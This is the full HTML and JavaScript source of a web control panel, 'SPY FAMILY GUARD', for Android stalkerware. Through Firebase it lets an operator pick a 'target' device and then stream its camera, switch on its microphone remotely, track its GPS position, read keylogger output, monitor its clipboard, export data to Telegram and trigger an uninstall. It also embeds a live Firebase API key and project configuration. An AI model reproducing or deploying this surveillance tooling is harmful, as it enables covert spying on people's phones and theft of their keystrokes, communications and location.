<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>SPY FAMILY GUARD | Secure Dashboard</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <style>
        :root {
            --primary: #5856D6;
            --primary-glow: rgba(88, 86, 214, 0.5);
            --secondary: #FF2D55;
            --accent: #AF52DE;
            --bg-deep: #000000;
            --card-bg: rgba(255, 255, 255, 0.08);
            --card-border: rgba(255, 255, 255, 0.15);
            --text-main: #FFFFFF;
            --text-muted: #A1A1AA;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
            --transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
            --ios-blur: blur(25px) saturate(180%);
            --neon-shadow: 0 0 15px var(--primary-glow);
        }

        body {
            margin: 0;
            font-family: 'SF Pro Display', 'Inter', sans-serif;
            display: flex;
            height: 100vh;
            background-color: var(--bg-deep);
            background-image: radial-gradient(circle at 20% 30%, rgba(88, 86, 214, 0.15) 0%, transparent 40%),
                              radial-gradient(circle at 80% 70%, rgba(255, 45, 85, 0.15) 0%, transparent 40%);
            overflow: hidden;
            color: var(--text-main);
        }

        .sidebar { width: 260px; background: var(--glass-bg); backdrop-filter: var(--ios-blur); border-right: 1px solid var(--glass-border); display: flex; flex-direction: column; z-index: 1000; transition: var(--transition); }
        .nav-group { padding: 15px; flex-grow: 1; overflow-y: auto; }
        .nav-item { padding: 12px 20px; display: flex; align-items: center; cursor: pointer; transition: var(--transition); font-size: 0.95rem; font-weight: 600; border-radius: 15px; color: var(--text-muted); gap: 15px; margin-bottom: 5px; }
        .nav-item i { width: 20px; text-align: center; }
        .nav-item:hover { background: rgba(255, 255, 255, 0.05); color: white; }
        .nav-item.active { background: var(--primary); color: white; box-shadow: var(--neon-shadow); }

        .main-content { flex-grow: 1; display: flex; flex-direction: column; overflow-y: auto; position: relative; }
        .content-body { max-width: 1200px; margin: 0 auto; width: 100%; padding: 30px; box-sizing: border-box; }

        .card { background: var(--card-bg); backdrop-filter: var(--ios-blur); border-radius: 30px; padding: 25px; border: 1px solid var(--card-border); margin-bottom: 20px; }
        .btn { border: none; padding: 12px 20px; border-radius: 18px; cursor: pointer; font-weight: 800; display: inline-flex; align-items: center; justify-content: center; gap: 10px; transition: var(--transition); text-transform: uppercase; letter-spacing: 1px; }
        .btn-primary { background: var(--primary); color: white; }
        .btn-danger { background: var(--secondary); color: white; }
        .btn-success { background: #34C759; color: white; }
        .btn-small { min-height: 40px; padding: 8px 15px; font-size: 0.75rem; }

        .status-badge { padding: 5px 15px; border-radius: 20px; font-size: 0.7rem; font-weight: 900; }
        .online { background: rgba(52, 199, 89, 0.2); color: #34C759; }
        .offline { background: rgba(255, 45, 85, 0.2); color: #FF2D55; }

        #stream-img { width: 100%; border-radius: 20px; background: #000; border: 4px solid #fff; min-height: 240px; object-fit: contain; box-sizing: border-box; }

        .perm-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-top: 15px; }
        .perm-item { padding: 12px; border-radius: 15px; background: rgba(255,255,255,0.03); display: flex; align-items: center; gap: 10px; font-size: 0.85rem; border: 1px solid var(--glass-border); }
        .perm-ok { color: #34C759; }
        .perm-no { color: #FF2D55; }

        #auth-overlay { position: fixed; inset: 0; background: black; z-index: 9999; display: flex; align-items: center; justify-content: center; }
        .login-card { background: rgba(255,255,255,0.08); border-radius: 40px; padding: 50px; width: 90%; max-width: 400px; text-align: center; backdrop-filter: blur(40px); }
        .login-field { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 15px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: white; text-align: center; box-sizing: border-box; }

        .page { display: none; }
        .page.active { display: block; }

        .feat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); gap: 10px; margin-top: 15px; }
        .feat-item { padding: 15px; border-radius: 20px; background: rgba(255,255,255,0.03); border: 1px solid var(--card-border); text-align: center; cursor: pointer; transition: 0.3s; }
        .feat-item.active { background: rgba(88, 86, 214, 0.2); border-color: var(--primary); }
        .feat-item i { font-size: 1.2rem; margin-bottom: 8px; }
        .feat-label { font-size: 0.7rem; font-weight: 800; display: block; }

        /* Mobile Adjustments */
        .mobile-header { display: none; padding: 15px; background: var(--glass-bg); backdrop-filter: var(--ios-blur); border-bottom: 1px solid var(--glass-border); align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 1001; }
        .menu-btn { font-size: 1.5rem; cursor: pointer; color: white; }

        @media (max-width: 768px) {
            body { flex-direction: column; }
            .sidebar { position: fixed; left: -260px; top: 0; bottom: 0; width: 260px; z-index: 2000; }
            .sidebar.open { left: 0; }
            .mobile-header { display: flex; }
            .content-body { padding: 15px; }
            .card { padding: 15px; border-radius: 20px; }
            h3 { font-size: 1.1rem; }
            .nav-item { padding: 10px 15px; }
            .sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 1500; backdrop-filter: blur(5px); }
            .sidebar-overlay.open { display: block; }
        }
    </style>
</head>

<body>
    <div id="auth-overlay">
        <div class="login-card">
            <h2 style="color: white; margin-bottom: 30px;">SPY GUARD LOGIN</h2>
            <input type="email" id="auth-email" class="login-field" placeholder="Admin Email">
            <input type="password" id="auth-pass" class="login-field" placeholder="Password">
            <button class="btn btn-primary" style="width: 100%;" onclick="handleLogin()">LOGIN</button>
        </div>
    </div>

    <div class="sidebar-overlay" id="sidebar-overlay" onclick="toggleSidebar()"></div>

    <div class="mobile-header">
        <div class="menu-btn" onclick="toggleSidebar()"><i class="fas fa-bars"></i></div>
        <h3 style="margin: 0; font-size: 1.2rem; letter-spacing: -1px;">SPY GUARD</h3>
        <div style="width: 24px;"></div>
    </div>

    <div class="sidebar" id="sidebar">
        <div style="padding: 25px; text-align: center;">
            <h2 style="margin: 0; color: white; letter-spacing: -1.5px;">SPY GUARD</h2>
            <select id="device-selector" style="width: 100%; padding: 10px; border-radius: 10px; background: #222; color: white; border: 1px solid #444; margin-top: 10px;"></select>
        </div>
        <div class="nav-group">
            <div class="nav-item active" onclick="showPage('dashboard')"><i class="fas fa-desktop"></i> Terminal</div>
            <div class="nav-item" onclick="showPage('remote')"><i class="fas fa-hammer"></i> Actions</div>
            <div class="nav-item" onclick="showPage('gps')"><i class="fas fa-location-dot"></i> GPS</div>
            <div class="nav-item" onclick="showPage('keylogs')"><i class="fas fa-keyboard"></i> Keylogger</div>
        </div>
        <div style="padding: 20px;"><button class="btn btn-danger" style="width: 100%; min-height: 40px;" onclick="auth.signOut()">LOGOUT</button></div>
    </div>

    <div class="main-content">
        <div class="content-body">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; flex-wrap: wrap; gap: 10px;">
                <div>
                    <h1 id="dev-name" style="margin:0; font-size: 1.5rem; font-weight: 900;">Select a Device</h1>
                    <div id="health-bar" style="font-size: 0.85rem; color: var(--text-muted); margin-top: 6px; display: flex; gap: 15px;"></div>
                </div>
                <div id="status-tag" class="status-badge offline">OFFLINE</div>
            </div>

            <!-- Dashboard -->
            <div id="page-dashboard" class="page active">
                <div class="card">
                    <div style="display:flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; margin-bottom: 15px;">
                        <h3>Live Camera</h3>
                        <div style="display:flex; gap:8px; align-items: center; flex-wrap: wrap;">
                            <div style="background: rgba(255,255,255,0.05); border-radius: 15px; padding: 5px 12px; display: flex; align-items: center; gap: 8px; border: 1px solid #444;">
                                <label style="font-size: 0.65rem; font-weight: 800;">QUALITY:</label>
                                <input type="range" id="stream-quality" min="1" max="100" value="25" style="width: 60px;">
                            </div>
                            <button class="btn btn-success btn-small" onclick="startStream('back')">REAR</button>
                            <button class="btn btn-success btn-small" onclick="startStream('front')">FRONT</button>
                            <button class="btn btn-danger btn-small" onclick="stopStream()">STOP</button>
                        </div>
                    </div>
                    <div style="text-align: center;">
                        <img id="stream-img" src="" alt="Camera Offline">
                    </div>
                </div>
            </div>

            <!-- Actions -->
            <div id="page-remote" class="page">
                <div class="card" style="text-align: center;">
                    <i id="mic-icon" class="fas fa-microphone" style="font-size: 3rem; color: var(--text-muted); margin-bottom: 20px;"></i>
                    <div style="display:flex; justify-content:center; gap:15px; flex-wrap: wrap;">
                        <button class="btn btn-success btn-small" onclick="mic(true)">START MIC</button>
                        <button class="btn btn-danger btn-small" onclick="mic(false)">STOP MIC</button>
                    </div>
                </div>

                <div class="card">
                    <h3>App Permissions Status</h3>
                    <div id="perm-list" class="perm-grid"></div>
                    <button class="btn btn-primary btn-small" style="margin-top:15px; width: 100%;" onclick="cmd('checkPermissions', true)">REFRESH PERMISSIONS</button>
                </div>

                <div class="card">
                    <h3>Features Toggle (RAM Optimizer)</h3>
                    <div class="feat-grid">
                        <div class="feat-item" id="feat-monitor" onclick="toggleFeat('monitor')"><i class="fas fa-heartbeat"></i><span class="feat-label">Monitor</span></div>
                        <div class="feat-item" id="feat-clipboard" onclick="toggleFeat('clipboard')"><i class="fas fa-paste"></i><span class="feat-label">Clipboard</span></div>
                    </div>
                </div>

                <div class="card">
                    <h3>Commands</h3>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px;">
                        <button class="btn btn-primary btn-small" onclick="cmd('ring', true)">ALARM</button>
                        <button class="btn btn-primary btn-small" onclick="cmd('vibrate', 1000)">VIBRATE</button>
                        <button class="btn btn-primary btn-small" style="background:#229ED9;" onclick="cmd('telegramExport', true)">TG EXPORT</button>
                        <button class="btn btn-primary btn-small" style="background:#0088cc;" onclick="cmd('telegramFilesExport', true)">FILE EXPORT</button>
                        <button class="btn btn-danger btn-small" onclick="cmd('uninstall', true)">UNINSTALL</button>
                    </div>
                </div>
            </div>

            <!-- Logs Pages -->
            <div id="page-gps" class="page"><div class="card"><h3>GPS <button class="btn btn-success btn-small" onclick="cmd('getGPS', true)">REFRESH</button></h3><div id="gps-map" style="height: 350px; border-radius: 20px;"></div></div></div>
            <div id="page-keylogs" class="page"><div class="card"><h3>Keylogger</h3><div class="table-container" id="keylogs-list"></div></div></div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCL7xPzTETS-BbKNJu3Q7yu3kMFVGqAX90",
            authDomain: "test-web2-57cbb.firebaseapp.com",
            projectId: "test-web2-57cbb",
            storageBucket: "test-web2-57cbb.firebasestorage.app",
            messagingSenderId: "170501005566",
            appId: "1:170501005566:android:afa8273d5916b67ccac5af",
            databaseURL: "https://test-web2-57cbb-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const auth = firebase.auth();

        let currentId = ""; let activeRefs = []; let map, marker;
        let audioCtx, nextStartTime = 0;
        let currentBattery = "--";
        let currentStorage = "--";

        function handleLogin() { auth.signInWithEmailAndPassword(document.getElementById('auth-email').value, document.getElementById('auth-pass').value).catch(e => alert(e.message)); }
        auth.onAuthStateChanged(user => { document.getElementById('auth-overlay').style.display = user ? 'none' : 'flex'; if(user) loadDevices(); });

        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('open');
            document.getElementById('sidebar-overlay').classList.toggle('open');
        }

        function loadDevices() {
            db.ref('devices').on('value', s => {
                const devs = s.val() || {}; const sel = document.getElementById('device-selector');
                const cur = sel.value; sel.innerHTML = '<option value="">Select Target...</option>';
                for(let id in devs) {
                    const opt = document.createElement('option');
                    opt.value = id;
                    const status = devs[id].health?.online ? " (ONLINE)" : " (OFFLINE)";
                    opt.innerText = (devs[id].info?.model || id) + status;
                    sel.appendChild(opt);
                }
                if(cur) sel.value = cur;
            });
        }

        document.getElementById('device-selector').onchange = e => { if(e.target.value) { currentId = e.target.value; document.getElementById('dev-name').innerText = e.target.options[e.target.selectedIndex].text; startSync(currentId); } };

        function updateHealthBar() {
            document.getElementById('health-bar').innerHTML = `<span>🔋 ${currentBattery}%</span><span>💾 ${currentStorage}</span>`;
        }

        function startSync(id) {
            activeRefs.forEach(r => r.off()); activeRefs = [];
            const base = `devices/${id}/`;

            db.ref(base + 'health').on('value', s => {
                const h = s.val() || {}; const st = document.getElementById('status-tag');
                st.innerText = h.online ? 'ONLINE' : 'OFFLINE'; st.className = 'status-badge ' + (h.online ? 'online' : 'offline');
                currentBattery = h.battery || "--";
                updateHealthBar();
            });

            db.ref(base + 'info').on('value', s => {
                const i = s.val() || {};
                currentStorage = i.storage || "--";
                updateHealthBar();
            });

            db.ref(base + 'features').on('value', s => {
                const f = s.val() || {}; ['monitor', 'clipboard'].forEach(k => {
                    const el = document.getElementById('feat-' + k);
                    if(el) {
                        if(f[k] === false) el.classList.remove('active'); else el.classList.add('active');
                    }
                });
            });

            db.ref(base + 'permissions').on('value', s => {
                const perms = s.val() || {}; let html = '';
                for(let p in perms) {
                    const icon = perms[p] ? '<i class="fas fa-check-circle perm-ok"></i>' : '<i class="fas fa-times-circle perm-no"></i>';
                    html += `<div class="perm-item">${icon} ${p}</div>`;
                }
                document.getElementById('perm-list').innerHTML = html || '<div class="perm-item">No Data Sync</div>';
            });

            db.ref(base + 'stream').on('value', s => { if(s.val()) document.getElementById('stream-img').src = 'data:image/jpeg;base64,' + s.val(); });
            db.ref(base + 'audioLive').on('value', s => { if(s.val()) playAudio(s.val()); });

            db.ref(base + 'location').on('value', s => {
                const l = s.val(); if(!l) return;
                if(!map) { map = L.map('gps-map').setView([l.lat, l.lng], 15); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); marker = L.marker([l.lat, l.lng]).addTo(map); }
                else { marker.setLatLng([l.lat, l.lng]); map.setView([l.lat, l.lng]); }
            });

            const liveNodes = { 'keylogs': 'keylogs-list' };
            for(let n in liveNodes) {
                db.ref(base + n).on('value', s => {
                    const data = s.val(); let html = '<table>';
                    html += '<tr><th>App</th><th>Log</th><th>Time</th></tr>';
                    Object.values(data||{}).reverse().forEach(v => {
                        html += `<tr><td>${v.app}</td><td>${v.text}</td><td>${v.time || '--'}</td></tr>`;
                    });
                    document.getElementById(liveNodes[n]).innerHTML = html + '</table>';
                });
            }
        }

        function cmd(c, v) { if(currentId) db.ref(`devices/${currentId}/commands/${c}`).set(v); }
        function toggleFeat(k) { if(currentId) { const el = document.getElementById('feat-'+k); db.ref(`devices/${currentId}/features/${k}`).set(!el.classList.contains('active')); } }
        function startStream(t) { if(currentId) db.ref(`devices/${currentId}/streamConfig`).set({enabled: true, type: t, quality: parseInt(document.getElementById('stream-quality').value)}); }
        function stopStream() { if(currentId) { db.ref(`devices/${currentId}/streamConfig/enabled`).set(false); db.ref(`devices/${currentId}/stream`).remove(); document.getElementById('stream-img').src = ''; } }
        function mic(on) { cmd('recordSurround', on); document.getElementById('mic-icon').style.color = on ? '#34C759' : '#A1A1AA'; if(on && !audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)({sampleRate: 16000}); }

        function playAudio(b64) {
            try {
                const bin = atob(b64); const bytes = new Int16Array(bin.length / 2);
                for(let i=0; i<bin.length; i+=2) bytes[i/2] = (bin.charCodeAt(i+1) << 8) | bin.charCodeAt(i);
                const floats = new Float32Array(bytes.length);
                for(let i=0; i<bytes.length; i++) floats[i] = bytes[i] / 32768.0;
                const buf = audioCtx.createBuffer(1, floats.length, 16000);
                buf.copyToChannel(floats, 0); const src = audioCtx.createBufferSource();
                src.buffer = buf; src.connect(audioCtx.destination);
                const now = audioCtx.currentTime; if(nextStartTime < now) nextStartTime = now + 0.05;
                src.start(nextStartTime); nextStartTime += buf.duration;
            } catch(e) {}
        }
        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            document.getElementById('page-' + id).classList.add('active');
            if (event) event.currentTarget.classList.add('active');
            if (window.innerWidth <= 768) toggleSidebar();
        }
    </script>
</body>
</html>
